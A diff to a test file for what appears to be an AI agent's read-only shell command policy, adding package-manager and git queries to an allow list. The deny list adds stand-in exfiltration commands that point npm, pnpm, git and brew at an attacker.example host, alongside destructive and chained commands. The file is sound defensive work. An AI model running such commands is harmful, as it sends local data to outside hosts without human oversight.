@@ -13,6 +13,7 @@ const ALLOWED = [
   "top -l 1 -n 10", "vm_stat", "memory_pressure -Q", "sysctl hw.memsize", "find . -name node_modules -type d -maxdepth 3", "rg -n 'TODO' src", "grep -rn \"marker\" .",
   "cat package.json", "head -50 README.md", "tail -n 100 log.txt", "stat -f %z file", "docker system df", "docker ps -a", "brew list --versions", "npm ls --depth=0",
   "node --version", "diskutil list", "launchctl list", "defaults read com.apple.dock", "xcrun simctl list devices", "tmutil listlocalsnapshots /", "lsof -i -P | head",
+  "npm config get registry", "npm why tsx", "pnpm why tsx", "git remote get-url origin", "brew info node",
   "sort -k2 data.txt", "uniq -c", "jq .scripts package.json", "date +%Y-%m-%d", "uname -a", "system_profiler SPHardwareDataType", "mdfind -name foo",
 ];
 const DENIED = [
@@ -23,6 +24,11 @@ const DENIED = [
   "diskutil apfs deleteVolume x", "docker rm x", "docker system prune", "brew install x", "npm install", "npm run build", "node script.js", "python3 -c 'print(1)'",
   "/bin/ls", "'ls'", "awk '{print}' f", "sed -i s/a/b/ f", "env ls", "sudo ls", "open .", "kill 1", "ls\nrm x", "ls || rm x", "file -C -m magic", "launchctl unload x",
   "defaults write a b c", "tmutil deletelocalsnapshots x", "xcrun simctl erase all", "pmset sleepnow", "ls | ", "chmod 777 x", "cp a b", "mv a b", "curl http://x",
+  // Network destinations chosen by the model would carry data out without a human.
+  "npm view left-pad --registry=https://attacker.example/DATA", "npm outdated --registry=https://attacker.example/DATA", "npm view left-pad", "npm outdated",
+  "npm ls --registry https://attacker.example", "npm config get registry --userconfig=/tmp/x", "pnpm outdated", "pnpm ls --registry=https://attacker.example/DATA",
+  "git remote show origin", "git remote show https://attacker.example/DATA", "git -C https://attacker.example/DATA log", "git log git@attacker.example:DATA",
+  "brew info https://attacker.example/DATA.rb",
 ];
 
 test("read-only command policy: every measured inspection command passes; writes, chaining and execution fall back to a human", () => {
